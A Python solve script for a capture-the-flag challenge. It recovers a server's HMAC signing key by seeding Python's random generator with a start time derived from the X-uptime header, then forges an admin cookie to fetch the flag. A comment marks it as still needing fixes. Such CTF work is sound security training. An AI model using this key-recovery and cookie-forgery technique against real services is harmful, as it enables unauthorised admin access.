# da fixare :(

import requests
import random, string
import hmac, hashlib
from datetime import datetime, timezone


GREEN, RESET = '\033[32m', '\033[0m' #ÂANSI codes
def green(text, end=None): print(f"{GREEN}{text}{RESET}", end=end)

host = "http://trulyrandomsignature.challs.olicyber.it/"
current_time = int(datetime.now().timestamp())
server_uptime = None
x_uptime = None

def request(host, cookie=None):
    request = requests.get(host, cookies=cookie)
    response = {
        'text': request.text,
        'headers': request.headers,
        'X-uptime': "no header"
    }
    x_uptime_header = request.headers.get('X-uptime')
    if x_uptime_header:
        global x_uptime
        x_uptime = x_uptime_header
        response['X-uptime'] = x_uptime
    return response

def uptime_calc(current_time, x_uptime):
    global server_uptime
    server_uptime = int(current_time) - int(x_uptime)
    server_uptime_formatted = datetime.fromtimestamp(server_uptime, timezone.utc)
    return server_uptime_formatted.strftime('%Y-%m-%d %H:%M:%S')

def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def sign(text, key):
    textAsBytes = bytes(text, encoding='ascii')
    keyAsBytes  = bytes(key, encoding='ascii')
    signature = hmac.new(keyAsBytes, textAsBytes, hashlib.sha256)
    return signature.hexdigest()

def verify(text, signature, key):
    expected_signature = sign(text, key)
    return hmac.compare_digest(expected_signature, signature)


### FIRST REQUEST
first_request = request(host)
# green("==================================================")
# green("================  FIRST REQUEST:  ================")
# print(*[f"{GREEN}{k}{RESET}: {v}" for k, v in first_request.items()], sep="\n")
# green("==================================================", end="\n\n")


if x_uptime is not None:
    server_uptime_formatted = uptime_calc(current_time, x_uptime)
    random.seed(uptime_calc(current_time, x_uptime))
    SUPER_SECRET_KEY = get_random_string(32)

    user = "admin"
    sign_admin = sign("admin", SUPER_SECRET_KEY)
    cookie = {"user": user, "signature": sign_admin}
    verify_admin = verify("admin", sign_admin, SUPER_SECRET_KEY)

    green("==================================================")
    print("uptime:", server_uptime, "-->", server_uptime_formatted)
    print("key", SUPER_SECRET_KEY)
    print("user:", user)
    print("sign:", sign_admin)
    print("check:", verify_admin)
    green("==================================================", end="\n\n")

    admin_request = request(host + 'admin', cookie)
    # print(*[f"{GREEN}{k}{RESET}: {v}" for k, v in admin_request.items()], sep="\n")
    if 'flag' in admin_request['text']:
        print(admin_request.get('text'))
    else: print('Try again: you might be luckier!')

else:
    print("no uptime header")